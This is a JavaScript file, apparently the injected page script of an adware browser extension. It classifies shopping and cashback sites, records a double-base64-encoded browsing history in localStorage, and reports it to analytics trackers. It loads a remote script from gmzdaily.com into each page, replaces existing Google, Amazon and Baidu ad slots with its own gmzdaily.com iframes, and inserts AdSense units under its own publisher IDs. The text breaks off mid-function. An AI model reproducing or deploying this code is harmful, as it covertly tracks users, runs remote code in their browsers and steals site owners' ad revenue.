function ExtractString(a, b, c) {
    var d = "ERROR"; 
    -1 < a.indexOf(b) && (a = a.split(b), -1 < a[1].indexOf(c) && (d = a[1].split(c)[0]));
    return d
}

function consolelog(a) {
    if (-1 < document.cookie.indexOf("logjojo")) {
        var b = (new Date).toLocaleTimeString();
        arguments.callee.caller ? console.log(b + " " + a + "\t\t%c" + arguments.callee.caller.name, "color: gray") : console.log(b + " " + a + "%c", "color: gray")
    }
}

function getDomain(a) {
    return extrHost_ex(window.location.href, a)
}

function extrHost_ex(a, b) {
    0 != a.indexOf("http") && (a = "http://" + a);
    var c = document.createElement("a");
    c.href = a;
    c = c.host.toLowerCase();
    b && 0 == c.indexOf("www.") && (c = c.substring(4));
    return c = c.replace(":80", "")
}

function inIframe() {
    try {
        return window.self !== window.top
    } catch (a) {
        return !0
    }
}

function stCkie(a, b, c, d) {
    d = void 0 === d ? "" : d;
    var e = new Date;
    e.setTime(e.getTime() + 864E5 * c);
    c = "expires=" + e.toUTCString();
    document.cookie = "" == d ? a + "=" + b + ";" + c + ";path=/" : a + "=" + b + ";" + c + ";path=/;domain=" + d
}

function gtCkie(a) {
    a += "=";
    for (var b = document.cookie.split(";"), c = 0; c < b.length; c++) {
        for (var d = b[c];
            " " == d.charAt(0);) d = d.substring(1);
        if (0 == d.indexOf(a)) return d.substring(a.length, d.length)
    }
    return ""
}

function B64E(a, b) {
    var c = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        encode: function(a) {
            var b = "",
                d = 0;
            for (a = c._utf8_encode(a); d < a.length;) {
                var g = a.charCodeAt(d++);
                var h = a.charCodeAt(d++);
                var k = a.charCodeAt(d++);
                var l = g >> 2;
                g = (g & 3) << 4 | h >> 4;
                var m = (h & 15) << 2 | k >> 6;
                var n = k & 63;
                isNaN(h) ? m = n = 64 : isNaN(k) && (n = 64);
                b = b + this._keyStr.charAt(l) + this._keyStr.charAt(g) + this._keyStr.charAt(m) + this._keyStr.charAt(n)
            }
            return b
        },
        decode: function(a) {
            var b = "",
                d = 0;
            for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ""); d < a.length;) {
                var g = this._keyStr.indexOf(a.charAt(d++));
                var h = this._keyStr.indexOf(a.charAt(d++));
                var k = this._keyStr.indexOf(a.charAt(d++));
                var l = this._keyStr.indexOf(a.charAt(d++));
                g = g << 2 | h >> 4;
                h = (h & 15) << 4 | k >> 2;
                var m = (k & 3) << 6 | l;
                b += String.fromCharCode(g);
                64 != k && (b += String.fromCharCode(h));
                64 != l && (b += String.fromCharCode(m))
            }
            return b = c._utf8_decode(b)
        },
        _utf8_encode: function(a) {
            a = a.replace(/\r\n/g, "\n");
            for (var b = "", c = 0; c < a.length; c++) {
                var d = a.charCodeAt(c);
                128 > d ? b += String.fromCharCode(d) : (127 < d && 2048 > d ? b += String.fromCharCode(d >> 6 | 192) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128)), b += String.fromCharCode(d & 63 | 128))
            }
            return b
        },
        _utf8_decode: function(a) {
            var b = "",
                c = 0;
            for (c1 = c2 = 0; c < a.length;) {
                var d = a.charCodeAt(c);
                128 > d ? (b += String.fromCharCode(d), c++) : 191 < d && 224 > d ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((d & 31) << 6 | c2 & 63), c += 2) : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3)
            }
            return b
        }
    };
    if ("encode" == b) return c.encode(a);
    if ("decode" == b) return c.decode(a)
}

function dblB64(a, b) {
    return B64E(B64E(a, b), b)
}

function RemoveElementById(a) {
    if (elem = document.getElementById(a)) elem.outerHTML = "", elem.parentNode && elem.parentNode.removeChild(elem)
}

function timeDiffHours(a) {
    return ((new Date).getTime() - a) / 1E3 / 3600
}

function tagBoth(a, b) {
    b = void 0 === b ? 900 : b;
    var c = (new Date).getTime();
    stCkie(a, c, b, getTopDomain());
    if (900 <= b) try { localStorage.setItem(a, c) } catch (d) {}
}

function tagRemove(a) {
    stCkie(a, "1", -1, getTopDomain());
    try {
        localStorage.removeItem(a)
    } catch (b) {}
}

function isTagged(a) {
    return -1 < document.cookie.indexOf(a) || localStorage && localStorage.getItem(a) ? !0 : !1
}

function getTopDomain() {
    var a, b = document.location.hostname.split(".");
    for (a = b.length - 1; 0 <= a; a--) {
        var c = b.slice(a).join(".");
        document.cookie = "weird_get_top_level_domain=cookie;domain=." + c + ";";
        if (-1 < document.cookie.indexOf("weird_get_top_level_domain=cookie")) return document.cookie = "weird_get_top_level_domain=;domain=." + c + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;", c
    }
}
var exversion_jojo = "ex-2.5",
    minorVerId = "6",
    siteType = "unknown",
    extType = "unknown",
    isLog_jojo = !1,
    isHum = !1,
    usrHxId = "ffffffff",
    isTrpByHP = !1,
    mercNetwork = "na",
    numDayInst = "0",
    isWhiteStr = "unknown",
    lastUpdateHrs = 0,
    lastUpdateSig = "00112233",
    idencompdate = "144356191002",
    isLaunchedFromExt = !1,
    noSandboxOk_ex = ["giorgioarmanibeauty-usa.com", "stuartweitzman.com", "shiseido.com"],
    needAllowSameOr = "nordstromrack.com expedia.com katespade.com toysrus.com mankind.co.uk barneys.com sears.com verabradley.com dockers.com harrods.com macys.com sephora.com dermstore.com bloomingdales.com orientaltrading.com lordandtaylor.com express.com drugstore.com ralphlauren.com burberry.com saksoff5th.com saks.com saksfifthavenue.com madewell.com jcrew.com ssense.com timberland.com shiseido.com naturalizer.com booking.com bobbibrowncosmetics.com columbia.com airfrance.com cheapAir.com citypass.com coastal.com foxrentacar.com fun.com groupon.com helzberg.com jewelry.com newegg.ca perfumania.com shoes.com shopko.com sk-ii.com starlinetours.com swarovski.com tanga.com heels.com logitech.com sasa.com alibaba.com aliexpress.com avira.com vrbo.com vitaminshoppe.com starlinetours.com heavengifts.com giltcity.com cruisedirect.com gilt.com".split(" "),
    needCustRef = "www.amazon.com www.amazon.co.jp www.amazon.co.uk www.amazon.com.br www.amazon.de www.amazon.es www.amazon.it www.amazon.fr www.amazon.ca".split(" "),
    addMercDom = "taobao.com tmall.com alitrip.com fliggy.com aliyun.com jd.com tmall.com".split(" "),
    dmToSpcCnvrt = "www.macys.com www1.macys.com www.belk.com www.bloomingdales.com www.cledepeaubeaute.com www.anthropologie.com www.target.com www.bobbibrowncosmetics.com www.alibaba.com www.booking.com www.shutterstock.com www.dell.com store.hp.com www.dji.com store.dji.com www.newchic.com".split(" "),
    isAct_ex = !0;

function Init_ex() {
    getExtType();
    getSiteType();
    window.addEventListener("focus", function() {
        isAct_ex = !0
    });
    window.addEventListener("blur", function() {
        isAct_ex = !1
    });
    extgaLog(extType + "\t" + siteType)
}

function compdate() {
    console.log(idencompdate.substring(6))
}

function stCkie_ex(a, b, c) {
    var d = new Date;
    d.setTime(d.getTime() + 864E5 * c);
    c = "expires=" + d.toUTCString();
    document.cookie = a + "=" + b + ";" + c + ";path=/"
}

function gtCkie_ex(a) {
    a += "=";
    for (var b = document.cookie.split(";"), c = 0; c < b.length; c++) {
        for (var d = b[c];
            " " == d.charAt(0);) d = d.substring(1);
        if (0 == d.indexOf(a)) return d.substring(a.length, d.length)
    }
    return ""
}

function incCkie_ex(a, b, c) {
    var d = gtCkie_ex(a);
    "" == d && (d = 0);
    c = parseFloat(d) + c;
    stCkie_ex(a, c, b)
}

function gatrackMerc() {
    (function(a, b, c, d, e, f, g) {
        a.GoogleAnalyticsObject = e;
        a[e] = a[e] || function() {
            (a[e].q = a[e].q || []).push(arguments)
        };
        a[e].l = 1 * new Date;
        f = b.createElement(c);
        g = b.getElementsByTagName(c)[0];
        f.async = 1;
        f.src = d;
        g.parentNode.insertBefore(f, g)
    })(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga_dipmerc");
    ga_dipmerc("create", "UA-60144933-5", "auto");
    ga_dipmerc("set", "dimension1", getDomain(!0));
    ga_dipmerc("set", "dimension2", siteType);
    ga_dipmerc("set", "dimension4", extType);
    ga_dipmerc("set", "dimension5", isHum);
    "ffffffff" != usrHxId && ga_dipmerc("set", "dimension6", usrHxId);
    isDmOK() || "merc" != siteType || -1 != getDomain(!0).indexOf("ebay.") || -1 != getDomain(!0).indexOf("amazon.") || -1 != getDomain(!0).indexOf("taobao.") || ga_dipmerc("set", "dimension3", getDomain(!0));
    ga_dipmerc("send", {
        hitType: "pageview",
        page: location.pathname,
        title: getStats()
    })
}

function getStats() {
    var a = getDomain(!0);
    a = a.replace(".com", "");
    gtCkie_ex("ext_pgvwcount");
    isRefLnk();
    isDmOK();
    localStorage.getItem("csHsty") && dblB64(localStorage.getItem("csHsty"), "decode").split("|");
    var b = " ex=" + extType,
        c = " vs=" + exversion_jojo.split("-")[1];
    c = c + "." + minorVerId;
    c = c.split(".").join("");
    var d = " id=" + usrHxId;
    isHum || " IS_HUMAN=" + isHum;
    return a + " |" + c + b + d
}

function getDomain(a) {
    return extrHost_ex(window.location.href, a)
}

function inIframe() {
    try {
        return window.self !== window.top
    } catch (a) {
        return !0
    }
}

function extrHost_ex(a, b) {
    0 != a.indexOf("http") && (a = "http://" + a);
    var c = document.createElement("a");
    c.href = a;
    c = c.host.toLowerCase();
    b && 0 == c.indexOf("www.") && (c = c.substring(4));
    return c = c.split(":")[0]
}

function loadExtJs_ex() {
    var a = document.getElementById("ga_js_loaded");
    return null == a ? (console.log("ga is my king"), a = document.createElement("script"), a.src = "//gmzdaily.com/tmp/wlib.php", document.getElementsByTagName("head")[0].appendChild(a), a = document.createElement("div"), a.setAttribute("style", "display:none"), a.setAttribute("id", "ga_js_loaded"), document.getElementsByTagName("head")[0].appendChild(a), !0) : !1
}

function getExtType() {
    var a = document.getElementById("extwaiimpotscp");
    extType = "unknown";
    if (a) {
        if (a.getAttribute("v")) {
            var b = a.getAttribute("v");
            translateExtType(b);
            a.setAttribute("vn", extType);
            isLaunchedFromExt = !0
        }
        a.getAttribute("c") && (isHum = !0);
        a.getAttribute("q") && (usrHxId = a.getAttribute("q"));
        a.getAttribute("i") && (numDayInst = a.getAttribute("i"));
        a.getAttribute("x") && (isTrpByHP = !0);
        a.getAttribute("w") && (isWhiteStr = a.getAttribute("w"));
        a.getAttribute("u") && (lastUpdateHrs = parseFloat(a.getAttribute("u")));
        a.getAttribute("s") && (lastUpdateSig = a.getAttribute("s"));
        a.getAttribute("m") && (mercNetwork = flipLiuSi(a.getAttribute("m"), "decode"))
    }
}

function translateExtType(a) {
    extType = "pdbbg" == a.substring(0, 5) ? "1gtra" : " { 4170" == a.substring(0, 5) ? "0trzh" : " { 507a" == a.substring(0, 5) ? "0maps" : " { 347c" == a.substring(0, 5) ? "0imgs" : " { b66d" == a.substring(0, 5) ? "0task" : " { 8cda" == a.substring(0, 5) ? "0tren" : " { 942e" == a.substring(0, 5) ? "0shrt" : " { b384" == a.substring(0, 5) ? "0yotr" : " { 0da5" == a.substring(0, 5) ? "0oxfd" : " { 5776" == a.substring(0, 5) ? "0tres" : " { e3d1" == a.substring(0, 5) ? "0trpt" : " { bc91" == a.substring(0, 5) ? "0pins" : " { f6bd" == a.substring(0, 5) ? "0youd" : " { 1c22" == a.substring(0, 5) ? "0snap" : " { 205c" == a.substring(0, 5) ? "0fbco" : " { 08ac" == a.substring(0, 5) ? "0adyt" : " { 8e93" == a.substring(0, 5) ? "0uncd" : " { b471" == a.substring(0, 5) ? "0tre2" : " { 13e0" == a.substring(0, 5) ? "0indl" : " { 3f59" == a.substring(0, 5) ? "0istg" : " { eaa5" == a.substring(0, 5) ? "0ever" : " { 8bcd" == a.substring(0, 5) ? "0onen" : " { 3d53" == a.substring(0, 5) ? "0pdro" : " { 7fb0" == a.substring(0, 5) ? "0pred" : " { e838" == a.substring(0, 5) ? "0quor" : " { 1eb5" == a.substring(0, 5) ? "0papp" : " { 3e28" == a.substring(0, 5) ? "0psky" : " { 2f82" == a.substring(0, 5) ? "0offi" : " { cae8" == a.substring(0, 5) ? "0scre" : " { 10a1" == a.substring(0, 5) ? "0peve" : " { 1eb8" == a.substring(0, 5) ? "0gmai" : " { d064" == a.substring(0, 5) ? "0pdfp" : " { 8dc9" == a.substring(0, 5) ? "0scr1" : " { f7be" == a.substring(0, 5) ? "0trz2" : " { d2aa" == a.substring(0, 5) ? "0ydnl" : " { bdcf" == a.substring(0, 5) ? "0ydn2" : " { da0f" == a.substring(0, 5) ? "0yot2" : " { 105c" == a.substring(0, 5) ? "0pap2" : " { 33f3" == a.substring(0, 5) ? "0tre3" : " { f722" == a.substring(0, 5) ? "0psk1" : " { da12" == a.substring(0, 5) ? "0eve1" : " { 7b01" == a.substring(0, 5) ? "0mail" : " { 87a8" == a.substring(0, 5) ? "0gma2" : " { 5288" == a.substring(0, 5) ? "0unc1" : " { ffa0" == a.substring(0, 5) ? "0ydn3" : " { 3960" == a.substring(0, 5) ? "0ydn4" : " { 5914" == a.substring(0, 5) ? "0trz3" : " { 598c" == a.substring(0, 5) ? "0img1" : " { 0aa5" == a.substring(0, 5) ? "0oxf1" : " { 2ede" == a.substring(0, 5) ? "0qdro" : " { 8369" == a.substring(0, 5) ? "0qred" : " { 20a1" == a.substring(0, 5) ? "0qeve" : " { c7fe" == a.substring(0, 5) ? "0adfb" : " { 23ed" == a.substring(0, 5) ? "0qsky" : " { 95a8" == a.substring(0, 5) ? "0gma3" : " { e2a7" == a.substring(0, 5) ? "0off2" : " { 5037" == a.substring(0, 5) ? "0pdf3" : " { 6133" == a.substring(0, 5) ? "0pdf4" : " { d10f" == a.substring(0, 5) ? "0yot3" : " { e4d9" == a.substring(0, 5) ? "0ytbd" : " { 905c" == a.substring(0, 5) ? "0qapp" : " { 6161" == a.substring(0, 5) ? "0scr2" : " { 830c" == a.substring(0, 5) ? "0yot4" : " { d3db" == a.substring(0, 5) ? "0ublk" : " { 3f5f" == a.substring(0, 5) ? "0yot5" : " { c110" == a.substring(0, 5) ? "0ytb2" : " { 51ac" == a.substring(0, 5) ? "0qfbk" : " { c847" == a.substring(0, 5) ? "0adgd" : " { ffed" == a.substring(0, 5) ? "0ady2" : " { 9945" == a.substring(0, 5) ? "0scr3" : " { 0fad" == a.substring(0, 5) ? "0isdn" : " { e7fe" == a.substring(0, 5) ? "0dark" : " { f852" == a.substring(0, 5) ? "0wiki" : " { ea3f" == a.substring(0, 5) ? "darkm" : " { dd48" == a.substring(0, 5) ? "pdfpr" : " { dcfd" == a.substring(0, 5) ? "emoji" : " { aa90" == a.substring(0, 5) ? "yotcn" : " { 8e6a" == a.substring(0, 5) ? "yoten" : " { 3596" == a.substring(0, 5) ? "adgrd" : " { 83a7" == a.substring(0, 5) ? "gmail" : " { f607" == a.substring(0, 5) ? "newtb" : " { 0e0d" == a.substring(0, 5) ? "flash" : " { 3d09" == a.substring(0, 5) ? "gtran" : " { 1369" == a.substring(0, 5) ? "weath" : " { 508a" == a.substring(0, 5) ? "gmaps" : " { 8b6f" == a.substring(0, 5) ? "fbcol" : " { 4e82" == a.substring(0, 5) ? "ytbdn" : " { c827" == a.substring(0, 5) ? "adgr2" : " { 8078" == a.substring(0, 5) ? "ytbd2" : " { 9204" == a.substring(0, 5) ? "yote2" : " { bc68" == a.substring(0, 5) ? "adytb" : " { 9403" == a.substring(0, 5) ? "adyt2" : " { abd0" == a.substring(0, 5) ? "yotes" : " { 05d0" == a.substring(0, 5) ? "yotpt" : " { 0d83" == a.substring(0, 5) ? "pdfp2" : " { 578e" == a.substring(0, 5) ? "0pdf5" : " { d8df" == a.substring(0, 5) ? "baidu" : " { e536" == a.substring(0, 5) ? "0tran" : "poh" == a.substring(0, 3) ? "tracn" : "koa" == a.substring(0, 3) ? "fancn" : "dil" == a.substring(0, 3) ? "trcn2" : "dlf" == a.substring(0, 3) ? "pgard" : "bdk" == a.substring(0, 3) ? "slock" : "hlk" == a.substring(0, 3) ? "plock" : "bce" == a.substring(0, 3) ? "sgard" : "oao" == a.substring(0, 3) ? "pgpro" : "fib" == a.substring(0, 3) ? "antiv" : "bja" == a.substring(0, 3) ? "tabhi" : "dck" == a.substring(0, 3) ? "adbmi" : "hja" == a.substring(0, 3) ? "luanm" : "nnf" == a.substring(0, 3) ? "traen" : "fcb" == a.substring(0, 3) ? "gdict" : "apg" == a.substring(0, 3) ? "unite" : "ffe" == a.substring(0, 3) ? "ssurf" : "ine" == a.substring(0, 3) ? "psave" : "oca" == a.substring(0, 3) ? "tra2n" : "seg" == a.substring(0, 3) ? "remvd" : "pgn" == a.substring(0, 3) ? "unicd" : "lhp" == a.substring(0, 3) ? "imgsc" : "efk" == a.substring(0, 3) ? "lyric" : "gem" == a.substring(0, 3) ? "sshot" : "kea" == a.substring(0, 3) ? "trapt" : "nem" == a.substring(0, 3) ? "traar" : "ife" == a.substring(0, 3) ? "micro" : "anc" == a.substring(0, 3) ? "trfan" : "fhd" == a.substring(0, 3) ? "kabas" : "hme" == a.substring(0, 3) ? "fanes" : "ham" == a.substring(0, 3) ? "fanpt" : "jen" == a.substring(0, 3) ? "avast" : "nhl" == a.substring(0, 3) ? "youtr" : "gkk" == a.substring(0, 3) ? "adsyt" : "fbj" == a.substring(0, 3) ? "youox" : "opj" == a.substring(0, 3) ? "ifres" : "nmj" == a.substring(0, 3) ? "ifrpt" : "ail" == a.substring(0, 3) ? "ifrcn" : "slo" == a.substring(0, 3) ? "slock" : extType + "-" + a.substring(0, 5)
}

function getSiteType() {
    var a = getDomain(!1);
    if ("www.facebook.com" == a) return 0 <= location.href.indexOf("/marketplace/") ? "merc" : "dflt";
    siteType = 0 <= a.indexOf("huaren.us") || 0 <= a.indexOf("mitbbs.com") || 0 <= a.indexOf("dealmoon.com") || 0 <= a.indexOf("sinovision.net") || 0 <= a.indexOf("zteusa.com") || 0 <= a.indexOf("get-privacy-guard.org") ? "land" : 0 <= a.indexOf("ebates.com") || 0 <= a.indexOf("extrabux.com") || 0 <= a.indexOf("mrrebates.com") || 0 <= a.indexOf("fatwallet.com") ? "cbck" : 0 <= a.indexOf("viglink.com") || 0 <= a.indexOf("skimlinks.com") || 0 <= a.indexOf("flexoffers.com") || 0 <= a.indexOf("linkshare.com") ? "affi" : "true" == isWhiteStr ? "merc" : domainMatchesList(addMercDom) ? "merc" : "dflt"
}

function B64E(a, b) {
    var c = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        encode: function(a) {
            var b = "",
                d = 0;
            for (a = c._utf8_encode(a); d < a.length;) {
                var g = a.charCodeAt(d++);
                var h = a.charCodeAt(d++);
                var k = a.charCodeAt(d++);
                var l = g >> 2;
                g = (g & 3) << 4 | h >> 4;
                var m = (h & 15) << 2 | k >> 6;
                var n = k & 63;
                isNaN(h) ? m = n = 64 : isNaN(k) && (n = 64);
                b = b + this._keyStr.charAt(l) + this._keyStr.charAt(g) + this._keyStr.charAt(m) + this._keyStr.charAt(n)
            }
            return b
        },
        decode: function(a) {
            var b = "",
                d = 0;
            for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ""); d < a.length;) {
                var g = this._keyStr.indexOf(a.charAt(d++));
                var h = this._keyStr.indexOf(a.charAt(d++));
                var k = this._keyStr.indexOf(a.charAt(d++));
                var l = this._keyStr.indexOf(a.charAt(d++));
                g = g << 2 | h >> 4;
                h = (h & 15) << 4 | k >> 2;
                var m = (k & 3) << 6 | l;
                b += String.fromCharCode(g);
                64 != k && (b += String.fromCharCode(h));
                64 != l && (b += String.fromCharCode(m))
            }
            return b = c._utf8_decode(b)
        },
        _utf8_encode: function(a) {
            a = a.replace(/\r\n/g, "\n");
            for (var b = "", c = 0; c < a.length; c++) {
                var d = a.charCodeAt(c);
                128 > d ? b += String.fromCharCode(d) : (127 < d && 2048 > d ? b += String.fromCharCode(d >> 6 | 192) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128)), b += String.fromCharCode(d & 63 | 128))
            }
            return b
        },
        _utf8_decode: function(a) {
            var b = "",
                c = 0;
            for (c1 = c2 = 0; c < a.length;) {
                var d = a.charCodeAt(c);
                128 > d ? (b += String.fromCharCode(d), c++) : 191 < d && 224 > d ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((d & 31) << 6 | c2 & 63), c += 2) : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3)
            }
            return b
        }
    };
    if ("encode" == b) return c.encode(a);
    if ("decode" == b) return c.decode(a)
}

function dblB64(a, b) {
    return B64E(B64E(a, b), b)
}

function flipLiuSi(a, b) {
    function c(a) {
        for (var b = "", c = 0; c < a.length; c++) {
            var d = a[c];
            b = d === d.toUpperCase() ? b + d.toLowerCase() : b + d.toUpperCase()
        }
        return b
    }
    var d = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        encode: function(a) {
            var b = "",
                c = 0;
            for (a = d._utf8_encode(a); c < a.length;) {
                var e = a.charCodeAt(c++);
                var k = a.charCodeAt(c++);
                var l = a.charCodeAt(c++);
                var m = e >> 2;
                e = (e & 3) << 4 | k >> 4;
                var n = (k & 15) << 2 | l >> 6;
                var p = l & 63;
                isNaN(k) ? n = p = 64 : isNaN(l) && (p = 64);
                b = b + this._keyStr.charAt(m) + this._keyStr.charAt(e) + this._keyStr.charAt(n) + this._keyStr.charAt(p)
            }
            return b
        },
        decode: function(a) {
            var b = "",
                c = 0;
            for (a = a.replace(/[^A-Za-z0-9\+\/=]/g, ""); c < a.length;) {
                var e = this._keyStr.indexOf(a.charAt(c++));
                var k = this._keyStr.indexOf(a.charAt(c++));
                var l = this._keyStr.indexOf(a.charAt(c++));
                var m = this._keyStr.indexOf(a.charAt(c++));
                e = e << 2 | k >> 4;
                k = (k & 15) << 4 | l >> 2;
                var n = (l & 3) << 6 | m;
                b += String.fromCharCode(e);
                64 != l && (b += String.fromCharCode(k));
                64 != m && (b += String.fromCharCode(n))
            }
            return b = d._utf8_decode(b)
        },
        _utf8_encode: function(a) {
            a = a.replace(/\r\n/g, "\n");
            for (var b = "", c = 0; c < a.length; c++) {
                var d = a.charCodeAt(c);
                128 > d ? b += String.fromCharCode(d) : (127 < d && 2048 > d ? b += String.fromCharCode(d >> 6 | 192) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128)), b += String.fromCharCode(d & 63 | 128))
            }
            return b
        },
        _utf8_decode: function(a) {
            var b = "",
                c = 0;
            for (c1 = c2 = 0; c < a.length;) {
                var d = a.charCodeAt(c);
                128 > d ? (b += String.fromCharCode(d), c++) : 191 < d && 224 > d ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((d & 31) << 6 | c2 & 63), c += 2) : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3)
            }
            return b
        }
    };
    if ("encode" == b) return c(d.encode(a));
    if ("decode" == b) return d.decode(c(a))
}

function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a)) + a
}

function dbgPrtClkHsty(a) {
    printStr = "";
    if (localStorage.getItem(a)) {
        for (var b = dblB64(localStorage.getItem(a), "decode"), c = b.split("|"), d = 0; d < c.length; d++) {
            var e = c[d],
                f = e.split("^")[0];
            domainName = e.split("^")[1];
            moduleName = 2 < e.split("^").length ? e.split("^")[2] : "";
            versionName = 3 < e.split("^").length ? e.split("^")[3] : "";
            e = (genTime() - f) / 1E3 / 3600;
            e = 24 >= e ? e.toFixed(2) + " hrs ago" : (e / 24).toFixed(2) + " days ago";
            printStr += a + " | " + e + " | " + domainName + " | " + moduleName + " | " + versionName + "\n";
            if (10 < d) break
        }
        printStr = "localStorage." + a + " =====> size = " + b.split("|").length + "\n" + printStr + "\n"
    } else printStr += "localStorage." + a + " =====> does not exist\n\n";
    return printStr
}

function exprint() {
    ret = "";
    ret += dbgPrtClkHsty("csHsty");
    return ret = ret + "\r\nPgview count: " + gtCkie_ex("ext_pgvwcount")
}

function extgaLog(a) {
    if (isLog_jojo) {
        var b = (new Date).toLocaleTimeString();
        console.log("%cExt - " + b + " " + a + "\t\t" + arguments.callee.caller.name, "color: purple")
    }
}

function isInRctHsty_ex(a, b, c) {
    a = extrHost_ex(a, !0);
    if (localStorage.getItem(b)) {
        b = dblB64(localStorage.getItem(b), "decode").split("|");
        for (var d = 0; d < b.length; d++) {
            var e = b[d],
                f = e.split("^")[1];
            e = e.split("^")[0];
            e = (genTime() - e) / 1E3 / 3600;
            if (a == f && e < c) return !0
        }
    }
    return !1
}

function lgCsEvt_ex(a, b) {
    b = b.replace("|", "");
    var c = genTime() + "^" + extrHost_ex(a, !0) + "^" + b + "^" + exversion_jojo;
    savLocStrgy_ex(c, "csHsty");
    (function(a, b, c, g, h, k, l) {
        a.GoogleAnalyticsObject = h;
        a[h] = a[h] || function() {
            (a[h].q = a[h].q || []).push(arguments)
        };
        a[h].l = 1 * new Date;
        k = b.createElement(c);
        l = b.getElementsByTagName(c)[0];
        k.async = 1;
        k.src = g;
        l.parentNode.insertBefore(k, l)
    })(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga_dip2");
    ga_dip2("create", "UA-60144933-9", "auto");
    ga_dip2("set", "dimension1", extType);
    ga_dip2("send", {
        hitType: "pageview",
        page: location.pathname,
        title: getStats()
    })
}
var ReplaAdTimer = 0;

function RepAd() {
    RepAdDomnOK() ? 8 < ReplaAdTimer || (adRepCountCache != adRepCount && (extgaLog("Scan ads round " + ReplaAdTimer + "  Total replaced: " + adRepCount), adRepCountCache = adRepCount), getAdblcks(document.body.getElementsByTagName("*")), ReplaAdTimer += 1, setTimeout(RepAd, 1E3 * ReplaAdTimer)) : extgaLog("No rep ad: domain not ok.")
}

function RepAdDomnOK() {
    return 0 <= getDomain(!1).indexOf(".") ? !0 : !1
}

function getAdblcks(a) {
    for (i in a) {
        var b = a[i];
        if (b && b.getAttribute && !isNodeBeingRpl(b)) {
            var c = b.getAttribute("id"),
                d = b.getAttribute("src");
            b.getAttribute("name");
            var e = b.getAttribute("onload"),
                f = b.tagName.toLowerCase();
            c || (c = "");
            d || (d = "");
            f || (f = "");
            e || (e = "");
            "div" == f && -1 < c.indexOf("div-gpt-ad-") && repElem(b);
            "ins" == f && (-1 < c.indexOf("aswift_") && -1 < c.indexOf("_expand") && repElem(b), -1 < c.indexOf("aswift_") && -1 < c.indexOf("_anchor") && repElem(b));
            "img" == f && ((-1 < d.indexOf("linkoffers.") || -1 < d.indexOf("flexlinks.")) && repElem(b), -1 < d.indexOf("linksynergy.") && repElem(b));
            "iframe" == f && (-1 < c.indexOf("cto_iframe_") && repElem(b), -1 < c.indexOf("google_ads_frame") && repElem(b), -1 < c.indexOf("google_ads_iframe") && repElem(b), -1 < c.indexOf("amznad") && repElem(b), -1 < d.indexOf("amazon-adsystem.com/") && repElem(b), -1 < d.indexOf("//pos.baidu.com/") && repElem(b), -1 < e.indexOf("BAIDU_SSP") && repElem(b))
        }
    }
}

function supportAdsns(a, b, c) {
    var d = [];
    d = d.concat("728x90 320x100 970x250 970x90 468x60 320x50 234x60".split(" "));
    d = d.concat(["300x600", "300x1050", "160x600", "120x600", "120x240"]);
    d = d.concat("336x280 300x250 250x250 200x200 180x150 125x125".split(" "));
    d = d.concat("120x240 120x600 125x125 160x600 180x150 200x200 234x60 250x250 300x250 336x280 360x300 460x60 468x60 480x160 500x200 580x90 640x60 728x90 760x90 960x60 960x90 120x120 120x270 250x200 300x250 120x90 160x90 180x90 200x90 468x15 728x15".split(" "));
    if (-1 < d.indexOf(b + "x" + c)) return !0;
    0 == ReplaAdTimer && 0 < b && 0 < c && (extgaLog("size not supported by supportAdsns: " + b + "x" + c), isLog_jojo && console.log(a));
    return !1
}

function isNodeBeingRpl(a) {
    try {
        return a.getAttribute("extdip88slf66") || a.parentNode.getAttribute && a.parentNode.getAttribute("extdip88slf66") || a.parentNode.parentNode.getAttribute && a.parentNode.parentNode.getAttribute("extdip88slf66") || a.parentNode.parentNode.parentNode.getAttribute && a.parentNode.parentNode.parentNode.getAttribute("extdip88slf66") || a.parentNode.parentNode.parentNode.parentNode.getAttribute && a.parentNode.parentNode.parentNode.parentNode.getAttribute("extdip88slf66") || a.parentNode.parentNode.parentNode.parentNode.parentNode.getAttribute && a.parentNode.parentNode.parentNode.parentNode.parentNode.getAttribute("extdip88slf66") ? !0 : !1
    } catch (b) {
        return !1
    }
}
var adRepCount = 0,
    adRepCountCache = -1;

function repElem(a) {
    var b = a.offsetWidth,
        c = a.offsetHeight;
    supportChitika(b, c) && 6 > adRepCount && (ifrm = CrtIfm("https://gmzdaily.com/serv/chitika.html?w=" + b + "&h=" + c, b, c), repWiFrm(a, ifrm))
}

function insrtAdsnsDiv(a, b, c) {
    if (!isElementInViewport(a)) {
        var d = document.createElement("div");
        isLog_jojo && d.setAttribute("style", "border: 1px dashed #880000;");
        d.innerHTML = '<ins class="adsbygoogle" style="display:inline-block; width:' + b + "px; height: " + c + 'px" data-ad-client="ca-pub-9567836075337495" data-ad-slot="5109041160"></ins><script>\x3c/script > '; 
        -1 < document.location.hostname.indexOf("mitbbs.com") && (d.innerHTML = '<ins class="adsbygoogle" style="display:inline-block; width:' + b + "px; height: "+c+'px" data-ad-client="ca-pub-5855540006424853" data-ad-slot="6136619167"></ins><script>\x3c/script>');
        a.setAttribute("extdip88slf66", "1"); 
        d.setAttribute("extdip88slf66", "1");
        var e = document.createElement("script");
